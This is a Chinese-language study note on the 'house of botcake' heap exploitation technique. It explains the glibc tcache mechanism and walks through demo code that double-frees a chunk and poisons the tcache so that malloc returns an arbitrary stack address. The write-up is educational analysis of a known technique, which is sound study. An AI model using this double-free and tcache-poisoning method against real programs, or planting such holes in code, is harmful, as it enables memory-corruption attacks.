# house of botcake

how2heap的house_of_botcake是tcache poisoning attack。利用双重释放的漏洞，令malloc返回任意地址。

## tcache简介

tcache是glibc2.26新加入的机制，malloc会优先在tcache bins中查找符合条件的chunk，接下来再按以前的顺序。

tcache bins类似于fast bins，默认最多有64个链表，每个链表能容纳7个chunk:

```c
/* 索引方式 */
# define usize2tidx(x) csize2tidx (request2size (x))

/* With rounding and alignment, the bins are...
   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)
   idx 1   bytes 25..40 or 13..20
   idx 2   bytes 41..56 or 21..28
   etc.  */

# define TCACHE_MAX_BINS		64

# define TCACHE_FILL_COUNT 7

/* 单链表 */
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;

typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS]; /* 链表中元素个数计数 */
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

由于是新机制，tcache的安全检查相对要少。接下来查看house_of_botcake代码来进一步学习。

## chunk overlap

申请空间部分略去。

```c
puts("Now we are able to cause chunk overlapping");
puts("Step 1: fill up tcache list");
for(int i=0; i<7; i++){
    free(x[i]);
}
puts("Step 2: free the victim chunk so it will be added to unsorted bin");
free(a);
    
puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
free(prev);
```

因为tcache list满了，于是a被放进unsorted bin中。`free(prev)`时发现其next chunk，即a已被free，于是发生前向合并。见malloc.c：

```c
if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) {
	unlink(av, nextchunk, bck, fwd);
	size += nextsize;
      } else
	clear_inuse_bit_at_offset(nextchunk, 0);
    .....
```

进行下一步。

```c
puts("Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n");
malloc(0x100);
/*VULNERABILITY*/
free(a);// a is already freed
/*VULNERABILITY*/
```

tcache是LIFO的，chunk在链表头进出。所以此段代码一个0x100chunk从表头取出，a再放到表头。可是a已经被释放了，这么做可行吗？

查看`_int_free()`中关于tcache的代码：

```c
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);

    if (tcache
	&& tc_idx < mp_.tcache_bins
	&& tcache->counts[tc_idx] < mp_.tcache_count)
      {
	tcache_put (p, tc_idx);
	return;
      }
  }
#endif
```

其中只检查了索引是否超出范围，和链表是否已满。再查看具体的放入tcache代码：

```c
static void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

也是只再次做了索引和计数的检查，不会发现double free的行为。于是a成功地被放进了tcache。

值得注意的是，e->next其实就是chunk的fd：

```c
/* chunk2mem将指向chunk header的指针换算为指向user data的指针 */
#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))

/* next就处于结构体开头 */
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;
```

## simple tcache poisoning

此时，a位于一个更大的释放过的chunk中（prev），我们可以利用这点来做tcache poisoning了。

```
intptr_t *b = malloc(0x120);

b[0x120/8-2] = (long)stack_var;
```

tcache中并没有0x120大小的chunk，而unsorted bin中只有一个chunk_size为0x220的prev，于是malloc将其切割并交给b。（b的chunk header位置应与之前prev的相同）

怎么通过b修改a？请看示意图：

![b内存示意图](C:\Users\38hjw\Documents\botcake_illustration.png)

于是在b指向地址开始移位0x110就是a的fd（next）。令其指向我们希望最后malloc返回的地址`stack_var`。

进行下一步之前，先看`__libc_malloc()`中有关tcache的代码。它直接按索引取出链表头，没有充分检查：

```c
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes = request2size (bytes);
  size_t tc_idx = csize2tidx (tbytes);

  MAYBE_INIT_TCACHE ();

  DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx < mp_.tcache_bins
      /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */
      && tcache
      && tcache->entries[tc_idx] != NULL)
    {
      return tcache_get (tc_idx);
    }
  DIAG_POP_NEEDS_COMMENT;
#endif
```

tcache_get也不会检查next是否合法：

```c
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```

所以说，我们将a从tcache中取出，链表头就会变为stack_var。

```c
malloc(0x100);/* 将a从tcache取出 */
```

再次malloc，程序根据0x100找到相应的tcache bin索引，并取出链表头元素，即stack_var。

```c
intptr_t *c = malloc(0x100);
```

最后检查是否成功：

```c
assert(c==stack_var);
printf("Got control on target/stack!\n\n");
```

![1560241319846](C:\Users\38hjw\AppData\Roaming\Typora\typora-user-images\1560241319846.png)

![1560241342159](C:\Users\38hjw\AppData\Roaming\Typora\typora-user-images\1560241342159.png)

## Note

在这个攻击中，我们可以再次释放b和a，然后故技重施修改a的fd。重复多次这个过程，我们可以令malloc返回很多任意指定的地址。

## 参考链接

[glibc-2.26-source](http://ftp.gnu.org/gnu/glibc/)

[libc2.26 之后的 Tcache 机制](<https://www.jianshu.com/p/3ef98e86a913>)

